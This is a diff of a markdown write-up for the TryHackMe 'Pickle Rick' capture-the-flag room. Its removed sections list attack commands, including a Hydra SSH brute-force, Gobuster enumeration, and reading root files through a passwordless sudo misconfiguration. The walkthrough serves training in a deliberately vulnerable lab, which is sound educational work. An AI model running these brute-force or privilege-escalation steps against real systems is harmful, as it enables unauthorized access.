@@ -308,84 +308,7 @@ fleeb juice
 
 With all three ingredients found, I completed the Pickle Rick room.
 
-## 11. Commands Used — Quick Reference
-
-This section gathers the commands from the steps above in one place. The SSH and Gobuster commands are included separately because they were part of the actual enumeration route.
-
-### Hostname setup
-
-```bash
-sudo nano /etc/hosts
-```
-
-Add:
-
-```text
-<TARGET_IP> pickle-rick.thm
-```
-
-### Nmap
-
-```bash
-nmap -sC -sV -o nmap_scan.txt pickle-rick.thm
-```
-
-### SSH brute-force attempt that did not work
-
-```bash
-hydra -l R1ckRul3s -P rockyou.txt ssh://pickle-rick.thm
-```
-
-Reason: the SSH service did not support password authentication.
-
-### Gobuster
-
-```bash
-gobuster dir -u http://pickle-rick.thm/ -w big.txt -x js,json,html,php,php.php,txt --no-error
-```
-
-### Commands entered in the web command panel
-
-```bash
-ls
-```
-
-```bash
-tac Sup3rS3cretPickl3Ingred.txt
-```
-
-```bash
-cd /home/rick && ls -lah
-```
-
-```bash
-tac /home/rick/second\ ingredients
-```
-
-```bash
-sudo -l
-```
-
-```bash
-sudo ls /root
-```
-
-```bash
-sudo tac /root/3rd.txt
-```
-
-### Manual browser checks
-
-These were visited in the browser rather than run as terminal commands:
-
-```text
-http://pickle-rick.thm/
-http://pickle-rick.thm/robots.txt
-http://pickle-rick.thm/login.php
-http://pickle-rick.thm/portal.php
-```
-
-## 12. Tools Used
+## 11. Tools Used
 
 | Tool | Purpose |
 |---|---|
@@ -398,28 +321,7 @@ http://pickle-rick.thm/portal.php
 | **Linux `tac`** | Reading files when common file-reading commands were blocked |
 | **`sudo`** | Checking and using the current user's elevated command permissions |
 
-## 13. Comparison with Public Walkthroughs
-
-I compared my route with the official TryHackMe room description and several public walkthroughs. The overall path matches the common solution:
-
-1. Find the username in the homepage source.
-2. Find the password-like value in `robots.txt`.
-3. Discover and log in to the portal.
-4. Use the command panel to read the first ingredient.
-5. Find the second ingredient in `/home/rick`.
-6. Check `sudo -l` and use the unrestricted passwordless sudo permission to read the root ingredient.
-
-A few details are worth clarifying:
-
-- **SSH:** My Hydra attempt failed because the service did not support password authentication. This is a service configuration issue, not proof that the credentials were wrong.
-- **Blocked file-reading commands:** Public walkthroughs use different alternatives, including `less`, `strings`, and `tac`. My screenshots show that I used `tac`.
-- **Rabbit-hole comment:** Repeated Base64 decoding produced `rabbit hole`. It was not necessary to obtain the three ingredients in my route.
-- **Second ingredient filename:** The screenshot shows `second ingredients` with a space, so the command must handle that space.
-- **Privilege escalation:** The decisive finding was `(ALL) NOPASSWD: ALL` for `www-data`. This allowed commands such as `sudo ls /root` and `sudo tac /root/3rd.txt` without needing a separate exploit.
-
-The room does not require a reverse shell for this route; the web command panel and the sudo misconfiguration were sufficient to retrieve all three ingredients.
-
-## 14. Key Takeaways
+## 12. Key Takeaways
 
 - Review page source for comments and information that is not visible on the rendered page.
 - Check `robots.txt` during web enumeration; it may expose sensitive strings or paths.
@@ -427,7 +329,6 @@ The room does not require a reverse shell for this route; the web command panel 
 - Read error messages carefully. Hydra's output showed that SSH password authentication was unavailable, so continuing to brute force passwords over SSH would not help.
 - If a command is blocked, understand the intended operation and look for a legitimate alternative. In this room, `tac` could read the files when `cat`, `head`, and `tail` were blocked.
 - Always run `sudo -l` when assessing local privilege escalation. Passwordless permission to run every command as root is a critical misconfiguration.
-- Keep track of the commands that worked, the attempts that failed, and the reason for each decision. That makes the final write-up more useful than a list of flags alone.
 
 ### Final Summary
 
